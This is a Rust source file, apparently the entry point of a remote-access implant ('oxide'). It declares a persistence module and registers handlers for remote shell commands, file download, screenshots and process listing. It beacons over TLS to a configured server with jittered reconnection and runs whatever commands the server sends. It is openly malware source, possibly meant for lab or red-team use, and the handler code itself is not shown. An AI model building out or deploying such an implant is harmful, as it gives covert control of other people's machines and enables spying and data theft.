mod persistence;
mod config;
mod transport;
mod checkin;
mod platform;
mod dispatcher;
mod commands;

use commands::{shell, file_list, file_download, screenshot, process_list};
use oxide_shared::packet::Packet;
use rand::Rng;
use std::time::Duration;

const RECONNECT_BASE: f64 = 1.0;
const RECONNECT_MAX: f64 = 60.0;
const RECONNECT_JITTER: f64 = 0.25;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = config::Config::lab_default();

    let mut dispatch = dispatcher::Dispatcher::new();
    dispatch.register("shell", Box::new(shell::ShellHandler));
    dispatch.register("file_list", Box::new(file_list::FileListHandler));
    dispatch.register("file_download", Box::new(file_download::FileDownloadHandler));
    dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
    dispatch.register("process_list", Box::new(process_list::ProcessListHandler));

    let mut backoff = RECONNECT_BASE;

    loop {
        println!("[*] Connecting to {}:{}...", config.host, config.port);

        match transport::Transport::connect(&config).await {
            Ok(mut transport) => {
                println!("[+] TLS handshake complete");
                backoff = RECONNECT_BASE;

                if let Err(e) = run_session(&mut transport, &dispatch).await {
                    eprintln!("[!] Session ended: {e}");
                }
            }
            Err(e) => {
                eprintln!("[!] Connect failed: {e}");
            }
        }

        let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
        let delay = backoff * (1.0 + jitter);
        eprintln!("[*] Reconnecting in {delay:.1}s...");
        tokio::time::sleep(Duration::from_secs_f64(delay)).await;
        backoff = (backoff * 2.0).min(RECONNECT_MAX);
    }
}

async fn run_session(
    transport: &mut transport::Transport,
    dispatch: &dispatcher::Dispatcher,
) -> anyhow::Result<()> {
    let checkin_pkt = checkin::build_checkin_packet();
    transport.send(checkin_pkt).await?;

    let ack = transport.receive().await?;
    let session_id = ack.data["session_id"].as_str().unwrap_or("?");
    println!("[+] Registered, session: {session_id}");

    loop {
        let packet = transport.receive().await?;
        match packet.packet_type.as_str() {
            "command" => {
                let response = dispatch.dispatch(&packet);
                transport.send(response).await?;
            }
            "heartbeat" => {
                let hb = Packet::new("heartbeat", serde_json::json!({}));
                transport.send(hb).await?;
            }
            other => {
                eprintln!("[!] Unknown packet type: {other}");
            }
        }
    }
}
